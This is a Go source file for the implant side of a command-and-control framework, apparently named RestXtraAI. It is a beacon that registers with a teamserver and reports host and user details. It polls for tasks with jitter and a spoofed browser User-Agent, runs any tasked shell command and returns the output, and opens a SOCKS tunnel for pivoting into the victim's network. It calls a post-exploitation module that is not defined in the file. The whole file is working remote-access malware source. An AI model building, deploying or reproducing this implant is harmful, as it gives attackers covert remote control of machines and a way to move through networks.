// Command beacon is the RestXtraAI C2 agent (implant-side). It implements the
// teamserver beacon protocol:
//
//	register  POST /register  -> upsert session, receive initial tasks
//	poll      POST /poll      -> pull queued tasks
//	result    POST /result    -> report task output
//
// Tasks:
//
//	shell <cmd>            execute a shell command and return stdout/stderr
//	tunnel_open <json>     open a SOCKS relay link back to the teamserver
//
// The agent is deliberately self-contained (stdlib only) so it can be built for
// any OS/arch with CGO_ENABLED=0.
package main

import (
	"bytes"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"os"
	"os/exec"
	"os/user"
	"runtime"
	"strings"
	"sync"
	"time"
)

// builtinConfig holds a base64-encoded JSON Config injected at build time via
// `-ldflags "-X main.builtinConfig=<b64>"` so a generated beacon runs without a
// sidecar config file. When empty, the beacon falls back to -config beacon.json.
var builtinConfig string

type Config struct {
	ServerURL   string `json:"server_url"`
	SessionID   string `json:"session_id"`
	IntervalSec int    `json:"interval"` // base poll interval seconds
	Jitter      int    `json:"jitter"`   // +/- percent
	RegisterURI string `json:"register_uri"`
	PollURI     string `json:"poll_uri"`
	ResultURI   string `json:"result_uri"`
}

type SysInfo struct {
	SessionID   string `json:"session_id"`
	Host        string `json:"host"`
	RemoteIP    string `json:"remote_ip"`
	Location    string `json:"location"`
	Hostname    string `json:"hostname"`
	Username    string `json:"username"`
	UID         string `json:"uid"`
	GID         string `json:"gid"`
	OS          string `json:"os"`
	Arch        string `json:"arch"`
	PID         int32  `json:"pid"`
	ProcessName string `json:"process_name"`
	Connection  string `json:"connection"`
}

type Task struct {
	ID      int64  `json:"id"`
	Command string `json:"command"`
}

type TaskResult struct {
	TaskID int64  `json:"task_id"`
	Output string `json:"output"`
	Error  string `json:"error"`
}

var logMu sync.Mutex

func logf(format string, a ...any) {
	logMu.Lock()
	defer logMu.Unlock()
	fmt.Fprintf(os.Stderr, "[beacon] "+format+"\n", a...)
}

func localIP() string {
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		return ""
	}
	for _, a := range addrs {
		if ipn, ok := a.(*net.IPNet); ok && !ipn.IP.IsLoopback() {
			if ip := ipn.IP.To4(); ip != nil {
				return ip.String()
			}
		}
	}
	return ""
}

func sysinfo(cfg *Config) SysInfo {
	hostname, _ := os.Hostname()
	uname := ""
	uid, gid := "", ""
	if u, err := user.Current(); err == nil {
		uname = u.Username
		uid = u.Uid
		gid = u.Gid
	}
	info := SysInfo{
		SessionID:   cfg.SessionID,
		Host:        localIP(),
		Hostname:    hostname,
		Username:    uname,
		UID:         uid,
		GID:         gid,
		OS:          runtime.GOOS,
		Arch:        runtime.GOARCH,
		PID:         int32(os.Getpid()),
		ProcessName: os.Args[0],
		Connection:  "http",
	}
	return info
}

func httpJSON(url string, v any, out any) error {
	body, err := json.Marshal(v)
	if err != nil {
		return err
	}
	req, err := http.NewRequest(http.MethodPost, url, bytes.NewReader(body))
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
	client := &http.Client{Timeout: 30 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	data, err := io.ReadAll(io.LimitReader(resp.Body, 1<<20))
	if err != nil {
		return err
	}
	if out == nil {
		return nil
	}
	return json.Unmarshal(data, out)
}

func execShell(cmd string) (string, string) {
	var c *exec.Cmd
	if runtime.GOOS == "windows" {
		c = exec.Command("cmd", "/C", cmd)
	} else {
		c = exec.Command("/bin/sh", "-c", cmd)
	}
	var out, errb bytes.Buffer
	c.Stdout = &out
	c.Stderr = &errb
	err := c.Run()
	output := strings.TrimSpace(out.String())
	if errb.Len() > 0 {
		output += "\n[stderr] " + strings.TrimSpace(errb.String())
	}
	errStr := ""
	if err != nil {
		errStr = err.Error()
	}
	return output, errStr
}

// ---- tunnel relay (SOCKS through the beacon) ----

const (
	frameDial  = 0
	frameData  = 1
	frameClose = 2
)

func writeFrame(w io.Writer, typ byte, stream uint32, payload []byte) error {
	var hdr [9]byte
	binary.BigEndian.PutUint32(hdr[:4], uint32(len(payload)))
	hdr[4] = typ
	binary.BigEndian.PutUint32(hdr[5:9], stream)
	if _, err := w.Write(hdr[:]); err != nil {
		return err
	}
	if len(payload) > 0 {
		_, err := w.Write(payload)
		return err
	}
	return nil
}

func readFrame(r io.Reader) (typ byte, stream uint32, payload []byte, err error) {
	var hdr [9]byte
	if _, err = io.ReadFull(r, hdr[:]); err != nil {
		return
	}
	ln := binary.BigEndian.Uint32(hdr[:4])
	typ = hdr[4]
	stream = binary.BigEndian.Uint32(hdr[5:9])
	if ln > 0 {
		payload = make([]byte, ln)
		if _, err = io.ReadFull(r, payload); err != nil {
			return
		}
	}
	return
}

func runTunnel(addr string) {
	for {
		conn, err := net.DialTimeout("tcp", addr, 10*time.Second)
		if err != nil {
			logf("tunnel dial %s: %v", addr, err)
			time.Sleep(5 * time.Second)
			continue
		}
		logf("tunnel link open: %s", addr)
		serveLink(conn)
		conn.Close()
		time.Sleep(5 * time.Second)
	}
}

type beaconLink struct {
	conn net.Conn
	wmu  sync.Mutex
}

func (b *beaconLink) write(typ byte, stream uint32, payload []byte) error {
	b.wmu.Lock()
	defer b.wmu.Unlock()
	return writeFrame(b.conn, typ, stream, payload)
}

// serveLink is the single reader on the held link: it dispatches dial requests
// to stream goroutines and routes data/close frames to the matching stream.
func serveLink(conn net.Conn) {
	bl := &beaconLink{conn: conn}
	streams := map[uint32]chan []byte{}
	closers := map[uint32]chan struct{}{}
	for {
		typ, stream, payload, err := readFrame(conn)
		if err != nil {
			return
		}
		switch typ {
		case frameDial:
			target := string(payload)
			dataCh := make(chan []byte, 64)
			stopCh := make(chan struct{})
			streams[stream] = dataCh
			closers[stream] = stopCh
			go runStream(bl, stream, target, dataCh, stopCh)
		case frameData:
			if ch, ok := streams[stream]; ok {
				select {
				case ch <- payload:
				default:
				}
			}
		case frameClose:
			if stop, ok := closers[stream]; ok {
				close(stop)
			}
			delete(streams, stream)
			delete(closers, stream)
		}
	}
}

// runStream dials the SOCKS target, acks the teamserver, then relays bytes
// between the target socket and the link (data/close frames).
func runStream(bl *beaconLink, stream uint32, target string, dataCh chan []byte, stopCh chan struct{}) {
	tc, err := net.DialTimeout("tcp", target, 10*time.Second)
	ack := []byte("ok")
	if err != nil {
		ack = []byte("err:" + err.Error())
	}
	_ = bl.write(frameDial, stream, ack)
	if err != nil {
		return
	}
	defer tc.Close()

	// target -> link
	go func() {
		buf := make([]byte, 32*1024)
		for {
			n, err := tc.Read(buf)
			if n > 0 {
				if werr := bl.write(frameData, stream, buf[:n]); werr != nil {
					return
				}
			}
			if err != nil {
				_ = bl.write(frameClose, stream, nil)
				return
			}
		}
	}()

	// link -> target
	for {
		select {
		case data := <-dataCh:
			if _, err := tc.Write(data); err != nil {
				return
			}
		case <-stopCh:
			return
		}
	}
}

func handleTask(t Task) TaskResult {
	res := TaskResult{TaskID: t.ID}
	cmd := strings.TrimSpace(t.Command)
	switch {
	case strings.HasPrefix(cmd, "tunnel_open "):
		var p struct {
			TunnelID int64  `json:"tunnel_id"`
			Addr     string `json:"addr"`
		}
		if err := json.Unmarshal([]byte(strings.TrimPrefix(cmd, "tunnel_open ")), &p); err != nil {
			res.Error = err.Error()
			return res
		}
		go runTunnel(p.Addr)
		res.Output = fmt.Sprintf("tunnel %d connecting to %s", p.TunnelID, p.Addr)
	case strings.HasPrefix(cmd, "postex "):
		rest := strings.TrimSpace(strings.TrimPrefix(cmd, "postex "))
		mod := rest
		args := ""
		if i := strings.IndexAny(rest, " \t"); i >= 0 {
			mod = rest[:i]
			args = strings.TrimSpace(rest[i+1:])
		}
		out, err := runPostex(mod, args)
		raw, _ := json.Marshal(map[string]any{"module": mod, "result": out, "error": errStrOf(err)})
		res.Output = string(raw)
		if err != nil {
			res.Error = err.Error()
		}
	case strings.HasPrefix(cmd, "shell ") || strings.HasPrefix(cmd, "exec "):
		rest := strings.TrimSpace(strings.TrimPrefix(strings.TrimPrefix(cmd, "shell "), "exec "))
		out, errStr := execShell(rest)
		res.Output, res.Error = out, errStr
	default:
		out, errStr := execShell(cmd)
		res.Output, res.Error = out, errStr
	}
	return res
}

func errStrOf(err error) string {
	if err == nil {
		return ""
	}
	return err.Error()
}

func pollLoop(cfg *Config) {
	for {
		var resp struct {
			Tasks []Task `json:"tasks"`
		}
		err := httpJSON(cfg.ServerURL+cfg.PollURI, map[string]string{"session_id": cfg.SessionID}, &resp)
		if err == nil {
			for _, t := range resp.Tasks {
				if t.Command == "" {
					continue
				}
				logf("task %d: %s", t.ID, t.Command)
				res := handleTask(t)
				_ = httpJSON(cfg.ServerURL+cfg.ResultURI, res, nil)
			}
		} else {
			logf("poll: %v", err)
		}
		time.Sleep(nextSleep(cfg.IntervalSec, cfg.Jitter))
	}
}

func nextSleep(base int, jitter int) time.Duration {
	if base <= 0 {
		base = 5
	}
	ms := float64(base) * 1000
	if jitter > 0 {
		ms *= 1 + (rand.Float64()*2-1)*float64(jitter)/100
	}
	return time.Duration(ms) * time.Millisecond
}

func main() {
	cfgFile := flag.String("config", "beacon.json", "path to beacon config JSON")
	flag.Parse()

	var data []byte
	if builtinConfig != "" {
		if b, err := base64.StdEncoding.DecodeString(builtinConfig); err == nil {
			data = b
		} else {
			data = []byte(builtinConfig)
		}
	}
	if len(data) == 0 {
		var err error
		data, err = os.ReadFile(*cfgFile)
		if err != nil {
			logf("read config: %v", err)
			os.Exit(1)
		}
	}
	var cfg Config
	if err := json.Unmarshal(data, &cfg); err != nil {
		logf("parse config: %v", err)
		os.Exit(1)
	}
	if cfg.ServerURL == "" || cfg.SessionID == "" {
		logf("config missing server_url/session_id")
		os.Exit(1)
	}
	if cfg.RegisterURI == "" {
		cfg.RegisterURI = "/register"
	}
	if cfg.PollURI == "" {
		cfg.PollURI = "/poll"
	}
	if cfg.ResultURI == "" {
		cfg.ResultURI = "/result"
	}

	info := sysinfo(&cfg)
	var reg struct {
		Tasks []Task `json:"tasks"`
	}
	if err := httpJSON(cfg.ServerURL+cfg.RegisterURI, info, &reg); err != nil {
		logf("register: %v", err)
	} else {
		logf("registered as %s (%s/%s)", cfg.SessionID, info.OS, info.Arch)
		for _, t := range reg.Tasks {
			if t.Command == "" {
				continue
			}
			res := handleTask(t)
			_ = httpJSON(cfg.ServerURL+cfg.ResultURI, res, nil)
		}
	}

	pollLoop(&cfg)
}
